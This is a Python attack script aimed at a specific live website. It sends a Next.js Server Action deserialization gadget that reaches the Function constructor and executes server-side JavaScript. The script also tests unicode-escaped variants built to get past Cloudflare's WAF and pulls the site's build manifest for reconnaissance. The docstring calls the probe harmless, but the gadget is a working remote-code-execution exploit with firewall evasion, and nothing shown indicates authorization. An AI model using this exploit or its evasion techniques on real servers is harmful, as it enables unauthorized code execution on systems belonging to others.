#!/usr/bin/env python3
"""Isolate Cloudflare blocking of the RSC/Server-Action POST and try benign WAF-evasion variants.
Non-destructive: only a harmless JS marker (no shell/file/system access)."""
import ssl, re, json, time, http.cookiejar, urllib.request, urllib.error

CTX = ssl.create_default_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
BASE = "https://onlyfakeai.ru"
BND = "----WebKitFormBoundary" + "x8jO2oVc6SWP3Sad"
cj = http.cookiejar.CookieJar()
OPENER = urllib.request.build_opener(
    urllib.request.HTTPSHandler(context=CTX),
    urllib.request.HTTPCookieProcessor(cj))


def req(method, url, headers=None, body=None, timeout=25):
    h = {"User-Agent": UA, "Accept": "*/*"}
    if headers:
        h.update(headers)
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with OPENER.open(r, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return 0, {}, str(e).encode()


def short(st, hd, b):
    cf = (hd.get("cf-mitigated") or "")
    return (f"HTTP {st} ct={(hd.get('content-type') or '')[:40]} "
            f"cf={cf} server={hd.get('server','')} len={len(b)} "
            f"rsc={('text/x-component' in (hd.get('content-type') or ''))}")


def is_cf_block(b):
    t = b.decode("utf-8", "ignore")
    return "Attention Required" in t or "cf-wrapper" in t or "Cloudflare" in t[:400]


def mp(fields):
    out = []
    for name, val in fields:
        out.append(f"--{BND}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{val}\r\n")
    out.append(f"--{BND}--\r\n")
    return "".join(out).encode()


# warm up cookie jar like a browser
st, hd, b = req("GET", BASE + "/")
print("warm GET /:", short(st, hd, b), "cookies:", [c.name for c in cj])

COMMON = {
    "Accept": "text/x-component",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": BASE,
    "Referer": BASE + "/",
    "sec-ch-ua": '"Chromium";v="131", "Not_A Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
}

# A) header-only test: Next-Action + empty multipart, no PoC fingerprint headers
st, hd, b = req("POST", BASE + "/", headers={**COMMON, "Next-Action": "x",
               "Content-Type": f"multipart/form-data; boundary={BND}"}, body=mp([("0", "{}")]))
print("A header-only action:", short(st, hd, b), "cfblock:", is_cf_block(b))
time.sleep(2)

# B) plain multipart POST to / with no Next-Action header (control)
st, hd, b = req("POST", BASE + "/", headers={**COMMON,
               "Content-Type": f"multipart/form-data; boundary={BND}"}, body=mp([("0", "{}")]))
print("B no-action multipart:", short(st, hd, b), "cfblock:", is_cf_block(b))
time.sleep(2)

# C) full gadget with JSON unicode-escaped keys/values, random-looking action id
prefix = ("var res=(typeof process!=='undefined'?process.version:'noproc');"
          "throw Object.assign(new Error('NEXT_REDIRECT'),"
          "{digest:'R2S_AUDIT_PROBE_'+res});")
payload = (
    '{"th\\u0065n":"$1:__prot\\u006f__:then",'
    '"status":"resolved_model","reason":-1,'
    '"value":"{\\"th\\u0065n\\":\\"$B1337\\"}",'
    '"_resp\\u006fnse":{"_pr\\u0065fix":' + json.dumps(prefix) + ','
    '"_ch\\u0075nks":"$Q2",'
    '"_formD\\u0061ta":{"get":"$1:constructor:constructor"}}}'
)
body = mp([("0", payload), ("1", '"$@0"'), ("2", "[]")])
st, hd, b = req("POST", BASE + "/", headers={**COMMON, "Next-Action": "a" * 40,
               "Content-Type": f"multipart/form-data; boundary={BND}"}, body=body)
txt = b.decode("utf-8", "ignore")
print("C escaped gadget:", short(st, hd, b), "cfblock:", is_cf_block(b),
      "MARKER:", "R2S_AUDIT_PROBE_" in txt)
print("   body:", txt[:500].replace("\n", " "))
if "R2S_AUDIT_PROBE_" in txt:
    i = txt.find("R2S_AUDIT_PROBE_")
    print("   >>> DIGEST:", txt[i:i + 150])
time.sleep(2)

# D) if CF blocked C, retry same gadget with only minimal browser headers
if is_cf_block(b):
    hdr = {"Next-Action": "b" * 40, "Content-Type": f"multipart/form-data; boundary={BND}",
           "Accept": "text/x-component"}
    st, hd, b = req("POST", BASE + "/en", headers=hdr, body=body)
    txt = b.decode("utf-8", "ignore")
    print("D minimal /en:", short(st, hd, b), "cfblock:", is_cf_block(b),
          "MARKER:", "R2S_AUDIT_PROBE_" in txt)
    print("   body:", txt[:300].replace("\n", " "))

# E) buildId from RSC payload for manifest analysis
st, hd, b = req("GET", BASE + "/", headers={"RSC": "1", "Accept": "text/x-component"})
t = b.decode("utf-8", "ignore")
m = re.search(r'"b":"([^"]+)"', t)
print("\nRSC buildId:", m.group(1) if m else None)
if m:
    bid = m.group(1)
    st, hd, b = req("GET", f"{BASE}/_next/static/{bid}/_buildManifest.js")
    print("buildManifest:", short(st, hd, b))
    print(b.decode("utf-8", "ignore")[:2500])
